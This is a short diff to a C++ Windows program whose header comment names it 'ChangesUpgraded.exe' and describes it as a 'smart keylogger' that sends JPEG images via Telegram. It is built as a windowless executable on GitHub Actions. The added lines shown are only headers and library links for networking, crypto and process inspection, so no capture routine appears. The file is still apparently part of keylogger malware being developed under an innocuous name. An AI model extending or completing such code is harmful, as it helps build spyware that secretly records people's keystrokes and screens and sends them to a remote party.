@@ -1,6 +1,42 @@
 // ChangesUpgraded.exe - VERSION 7 - SMART KEYLOGGER + JPEG TELEGRAM + INTELLIGENT TRIGGERS
 // COMPILES CLEAN ON GitHub Actions windows-2022 with /O2 /MT /SUBSYSTEM:WINDOWS
 
+// REMOVE OR COMMENT OUT THIS LINE since we'll pass it via command line
+// #define NOMINMAX
+#define WIN32_LEAN_AND_MEAN
+
+#include <windows.h>
+#include <winhttp.h>
+#include <string>
+#include <vector>
+#include <thread>
+#include <chrono>
+#include <sstream>
+#include <shlobj.h>
+#include <map>
+#include <wincrypt.h>
+#include <iphlpapi.h>
+#include <iomanip>
+#include <queue>
+#include <algorithm>
+#include <userenv.h>
+#include <objidl.h>  // For IStream
+#include <psapi.h>   // ADDED: For GetModuleFileNameExW
+
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "kernel32.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "version.lib")
+#pragma comment(lib, "psapi.lib")   // ADDED: For GetModuleFileNameExW
+
+
 // FIX: Add NOMINMAX to prevent min/max macro conflicts
 #define NOMINMAX
 #define WIN32_LEAN_AND_MEAN
